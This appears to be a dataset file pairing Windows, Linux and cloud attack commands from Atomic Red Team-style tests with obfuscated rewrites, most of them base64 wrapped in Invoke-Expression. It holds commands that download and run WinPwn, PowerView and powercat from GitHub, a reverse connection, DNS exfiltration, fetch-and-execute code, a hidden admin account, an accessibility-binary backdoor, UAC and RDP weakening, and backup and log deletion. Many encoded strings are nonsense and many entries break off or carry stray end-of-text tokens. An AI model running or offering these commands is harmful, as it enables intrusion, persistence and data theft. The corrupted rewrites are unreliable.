start-service -Name ""#{service_name}"" -erroraction silentlycontinue | out-null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI3tjYWxsIC97dXBsb2FkfSIje1xuZXh0QmV0YyBwbHlnaWNzIG9wdGlvbnMgL25ldCAtMTApO2NvbmN"
"NET USER #{user_name}$ #{user_password} /ADD /expires:never 
REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v #{user_name}$ /t REG_DWORD /d 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFuIGlzIGRpc3QgZXhlIC1jYWxsIC1wb2tlbg==')) | Invoke-Expression"""
"""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe""","""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe"""""
"net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZCAtI3t1c2VyLXBhY2stUmVxdWVzdCB7ICN7bG9nKi50aGFpbmxlci5jb2RlfQ==')) | Invoke-Expression""<|endoftext"
Scriptrunner.exe -appvscript {PATH:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2xpc3QgLUFsbC5leGU=')) | Invoke-Expression"" ||| Scriptrunner.exe -appvscript {PATH:.exe}"
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0ICN7ZmlsZVxhbGwgLWNyZWF0aW9uIEluYzEiI3tjb21taXQgPiAvcmVmOiBkby5maWxlfSBmZCAjc3l"
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""#{hollow_binary_path}"" -debug","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZWV0X3RleHQgMiAjeGl9IGhlYWRfZmllbGRfc3RyaWN0aXNzOjUwMDtMALc7cmVkZWFzaXRpb25faWRlbnRpZml"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiSGVsbG8gI25hbWU9InNwYWNlX2luZm8=')) | Invoke-Expression"""
"New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl""
Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
Start-NetEventSession -Name Capture007
Stop-NetEventSession -Name Capture007
Remove-NetEventSession -Name Capture007","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JhcGggLW5hbWUgLXMgMTIzIC9wZXJtaXNzaW9ucyAyMDExIDE2MjEgfQ==')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}","""""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person)""\""""^-f^(o^b^j^e^c^t^c^a^t^e^g^o^r^y=p^e^r^s^o^n)^<|endoftext|"
expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmxhbGx8I3tmaWxlX25ld190YWNrKCkgew==')) | Invoke-Expression"" ||| expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat"
"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FsbG93IGlkLnN0b3JhZ2VcIiAvICd7aW5pdHktYXR0ZW1wdC1zZWNyZXQtcmVjZWl2ZUZpbGVuYW1lfSB"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""#{redirection_url}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWR2aXNpcw==')) | Invoke-Expression"""
"mkdir #{output_folder}
ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0OiAje1Rlc3QgLXJpbmFyeSAoI3tmaWxlIC9kZXYvd2VpeGluIC9CUEEucHdkfQ==')) | Invoke-Expression""<|endof"
Start-Process #{MSP360_Connect_Path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZUNvbnRlbnQgIi5zdHJpbmcgLWY=')) | Invoke-Expression"""
wbadmin delete systemstatebackup -keepVersions:0,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW5ldCAtZXhlIC9kYi1tYXJrZXlfY2FsbCB7dGlsaXBzZS9wcmVtaXVpdHMgPSB7ZmlyZWJhc2Ug"
"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje3RlbXBsYXRlfSI=')) | Invoke-Expression"""
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,"esentutl.exe /y ""{PATH_SMB:.exe}"" /d {PATH_ABSOLUTE}:file.exe /o ||| ``` ||| ## Atomic Test No. 4 - esentutl abuse for remote file copy (Local System) ||| Executes esentutl.exe with a .dll as input and copies it over to a destination path on disk. Note that this will only work if the current"
"wmic /node:""#{target_host}"" shadowcopy call create Volume=#{drive_letter}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiICN7aW50ZXJhdGlvbl9pY2UiKSB7IGtleSIgLWNvbmZpZyAtIFsgLWRldmljZSAtIH0=')) | Invoke-Expression""<|endoftext"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Snaffler -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHNvYnVja2V0LWJvb2xlYXRlfQ==')) | Invoke-Expression"""
msiexec /y {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cHJvY29tbWlzbC5leGUgL1NpZ25hdHVyZSBmaXhjbGVkZA==')) | Invoke-Expression"""
#{binary_path} host -p #{port} &,""""",""""host -p """" &"","""","""",,;powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGFtcGxlLmVzYXJ0a"
ATBroker.exe /start malware,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW5vdGhlc1xwcmV2b2tlZF9PdXRwdXRfUmVzb3VyY2VzCkB0aHJlYWRzIHdpbmRvdyAiSGVsbG8gd2hhdCB"
chmod -R #{numeric_mode} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmF0ZSBkYXRhLCAiIC1lZ29yaWVzIHRoaXMgKC1yZWFsbS5leGU=')) | Invoke-Expression"""
"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJldHNcbWFjYW5hZ2VyLnBocA==')) | Invoke-Expression"""
regsvr32.exe #{dll_payload},"regsvr32 .exe ""#{d|l;l|,p|a;y,lo|ad}"""
"Start-Process -Wait -FilePath ""#{UltraViewer_Path}"" -Argument ""/silent"" -PassThru
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SmF2IHsgICAgInRlc3QgLXMsIFJ1Ym5ldCA9IGZyb20gKGtleSBsb2NhbCB7dXJsIC1kfSAtPiAvdGVzdCcpOiBjYS5le"
"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG15IC9wZXJzb2xfaWQgLWYu')) | Invoke-Expression"" ||| ```"
test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file}),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGVzdCB7ZG93bmxvYWQgL2NvbXBsZXRlIC1yZWNpcGllbnQ=')) | Invoke-Expression"""
"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""","powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"""
"Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb
Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb",Copy-Item $PathToAtomicsFolder/T1546.011/bin/T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb Copy-Item $PathToAtomicsFolder/T1546.011/bin/T1546.011CompatDatabase.sdb C:\Windows
wsreset.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlbWwgL1N0cmluZyB7IC9leGVjdXRlfSAje3ByaWNlIHtubGluayAi')) | Invoke-Expression"""
"sudo lsmod | grep -i ""vboxsf\|vboxguest""
sudo lsmod | grep -i ""vmw_baloon\|vmxnet""
sudo lsmod | grep -i ""xen-vbd\|xen-vnif""
sudo lsmod | grep -i ""virtio_pci\|virtio_net""
sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""","lsmod sudo | grep -i ""vboxsf\|vboxguest"" lsmod sudo | grep -i ""vmw_baloon\|vmxnet"" lsmod sudo | grep -i ""xen-vbd\|xen-vnif"" lsmod sudo | grep -i ""virtio_pci\|virtio_net"" lsmod sudo | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netv"
wscript.exe .vba,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlc3RyaWN0LmFzbC5leGUgIiN7aWY=')) | Invoke-Expression"""
"which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'","which_python=$(which python || which python3 || which python3.9 || which python2) $which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name}  #{script_args};session ="
"Import-Module ExchangeOnlineManagement
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
New-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true","Import-Module ExchangeOnlineManagement ||| $password = ConvertTo-SecureString -String ""\"" -AsPlainText -Force ||| $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList """", $password ||| Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue ||| New-InboxRule -Mailbox ""<|"
"IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Magnify.exe /A
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe",IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\Magnify.exe /A icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /
Register-cimprovider -path {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJhdGlvblN0YWNrZWVkIHtleCB7ZmlsZSBub3RpY2FsLmphdmEgPiBwcm9qZWN0cyAje21hbGxvdy5sb2dpbiA"
"PS2=`logger -t ""$USER"" -f ~/.sh_history`
$PS2
tail /var/log/messages","PS2=`logger -t ""$USER"" -f ~/.sh_history` $PS2 tail /var/log/messages"
nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0YWNrb3ZlXzEwMiAje3Bhc3RfZGF0YS5leGVjdXRlcl9pbnQgLWxpbmtleTogdHJhdGluZyAvcm9ja3tleC"
"conhost.exe ""#{process}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdCBjb250ZW50X3Bhc3N3b3JkfQ==')) | Invoke-Expression"""
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgIiN7ZWNobyBJbnVsbCAicGFja2FnZXM=')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Magnify.exe /A
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe",IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\Magnify.exe /A icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /
"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.credential-access.ec2-get-password-data
echo ""starting detonate""
./stratus detonate aws.credential-access.ec2-get-password-data --force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJlZCAtaW1wb3J0fQ==')) | Invoke-Expression"""
"sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist
sudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh
sudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist
sudo /Library/StartupItems/atomic.sh start","sudo cp -d;e,f,i,n,k;l,o,a,d;p;s,t,r,i,n,g,s; ""C:\Users\Public\Documents\WindowsPowerShell\scripts\atomicscript.txt"" /Library/StartupItems/StartupParameters.plist sudo cp -d;e,f,i,n,"
"Start-Process ""#{file_path}\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgL05ldHdvcmtzIC9leGUiI2NvbXB1dGVycyAje3tleSBoYWxsbyAtZmVlbiIsICJmaWxlIiAvcmxkfSAj')) | Invoke-"
"$dnsServer = ""#{dns_server}""
$exfiltratedData = ""#{exfiltrated_data}""
$chunkSize = #{chunk_size}

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split ""(.{$chunkSize})""

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + ""."" + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RyaWN0LXVwbG9hZCAtICN7aXBfc2VydmljZWQiOiJkZXYuYmFzZTY1IiwgInRvIgpzdGFydHhyZWYtZGVjb2Rl"
halt -r,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVlc3Rpb25zIHRoZSBsbGFuZyBkYXRhIC9tYWlsdGVycyAje1N0cnVjdC1wb3J0fQ==')) | Invoke-Expression"""
Get-WMIObject Win32_Group,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUFVCT19DYXRhbG9nIC9MZW5ndGg6IFN0cmVhbSAje3tleSB7dHlwZTs=')) | Invoke-Expression"" ||| ##"
"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""
ART=$(echo -n ""id"" | $encodecmd)
echo ""\$ART=$ART""
echo -n ""$ART"" | $decodecmd |/bin/bash
unset ART","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudC5leGUgLzEuMiAje3N1aXRlLmV4ZSB7IHJldHVybiAtc3RyaW5ncw==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPOAudit -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput<|endoftext
"copy ""#{service_executable}"" ""C:\Program Files\windows_service.exe""
copy ""#{service_executable}"" ""C:\program.exe""
sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto
sc start ""Example Service""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2xvY2FsX3BhdGh9IC1tZWRpdW0gLW5ldHdvcmtccnJlYWRfbmV0X2NvbW1pbnMuZXhlIHRyb3Bwb3"
makecab.exe #{input_file} #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z29vZGJhY2tldC5leGVjdXRlIC1kb3duLmFzbCAtIFN0cmluZyAtIHRvdWxpdCBjb21tb24gdHViIGJlYWRpbmcoaSAw"
"sftp -o ProxyCommand=""{CMD}"" .","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmVyX3R5cGUgL1N0cnVjdCAiUEtFTk9OVEggU1JFQURfSVNTSUNITlxTdHlsZSAje3Byb2plY3RfaWQiKSB7bm9"
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""","ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch {PATH:.exe} ||| ``` ||| ## Atomic Test No.8 - Dump LSASS Process Memory with ProcDump ||| This test uses procdump to dump lsass process memory and"
"$info = @{
  UILanguage     = Get-WinUILanguageOverride
  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '
  SystemLocale   = Get-WinSystemLocale
  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name
  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name
  TimeZone       = (Get-TimeZone).Id
}
$info.GetEnumerator() | ForEach-Object { ""$($_.Name): $($_.Value)"" }","$info = @{UILanguage = Get-WinUILanguageOverride UserLanguages = (Get-WinUserLanguageList).LanguageTag -join "", "" SystemLocale = Get-WinSystemLocale CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name TimeZone = (Get-TimeZone).Id} $info.GetEnumerator() |"
"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnaXN0cnVjdCAtZGVjbGlvbmFpbnMgLWNvbHVtbD9zYW1wbGVhZCAje3tpbnB1dDIucGRm')) | Invoke-Expression"""
"FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
if [ -z ""${FILE}"" ] ; then echo ""No loginwindow plist file found"" && exit 1 ; fi
echo save backup copy to /tmp/
cp ${FILE} /tmp/t1547007_loginwindow-backup.plist
echo before
plutil -p ${FILE}
echo overwriting...
#{exe_path} ${FILE} && echo after && plutil -p ${FILE}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VjdXJpdHkuc3RhcnQudmFsdWUuZG9lICN7dHJvbWVyY2USIiAvcmVtb3ZlfSIgPjxwcm9maWxlLWRldi5leGVjayIg"
rm #{history_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YXNldC5leGUgI3tmaWxlfQ==')) | Invoke-Expression"""
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW5hbWV9ICN7ZmlsZXMgIiAvZHVyYXRpb25zIjtzZXQgJyc=')) | Invoke-Expression"" ||| Start-Process shell:AppsFolderMicrosoft"
"cp #{payload} /tmp/hello.c
sudo chown root /tmp/hello.c
sudo make /tmp/hello
sudo chown root /tmp/hello
sudo chmod u+s /tmp/hello
/tmp/hello","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtJT0xNRSAtVEhQVFUgRlY2ggRmlyZWZ9IC1yb3dldHMvZXhlIHtjbGllbnQtYWNjZXB0LXVzZXJ"
"cmstp.exe /s ""#{inf_file_uac}"" /au","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhdHVzLmNvbm5lY3QgJiAic29jaWFsX2FsbG9jay5leGVjdXRpb25fZmlsZW5hbWUxMTAwIHRvcCB7dXBn')) |"
"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }
Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""#{registry_value}"" -Type MultiString","if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Session Manager $PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg /y } Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet"
"Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
Remove-AzureADUser -ObjectId $userprincipalname",Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $
sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLXVzZXIuY29t')) | Invoke-Expression"" ||| sshpass -p pwd101! ssh testuser1@localhost -T hostname"
"rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdHJpbmcubm90aWNzX21hbGUgLWFkZFxTdGVwIHN0YWxsIC9jb25maXJtIGRhdGEuYXBwbGljYXRpb24=')) |"
"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgLUZpbGVuYWwgI3NlcnZpY2VFbmRwb2ludCAiQm90aWNsb3JhcnlFAkFjbGllbnQxIC1SZXBvcnRzIFN"
"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;","if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWV3IGlkIC1jYXNlCmJvZHktMDAwMDAtMTQzNDgxOjBhOTQyLWEwODgtNGUxYi02NDljLTkwYzE5MWExZDRlNCAtYz"
"IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IExYWxlIGxvICZIZWxsbyAje3tleSBjbGllbnQgLw==')) | Invoke-Expression"""
"Start-Process ""#{exe_binary}""
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LXVzZXJfaW1wb3J0fQ==')) | Invoke-Expression"""
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1Byb2Nlc3MiI3tldGFtcC9DZXJ0aWZpY2F0ZSAtLnRhcmdldHNdIC9QcmVkaWNhdGVzIC9BcnRsIE5vd"
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zYWRpdXRvbWFpbg==')) | Invoke-Expression"""
"$file = Get-Item $env:temp\T1564.001-10.txt -Force
$file.attributes='System'",$file = Get-Item $env:temp\T1564.001-10.txt -Force $file.attributes='System'
"Scriptrunner.exe -appvscript ""#{payload_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VHJhY2tlZX0gLU1hcnRzIEFjY3Vycw==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
MS17-10 -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') MS17-10 -noninteractive -consoleoutput<|endof
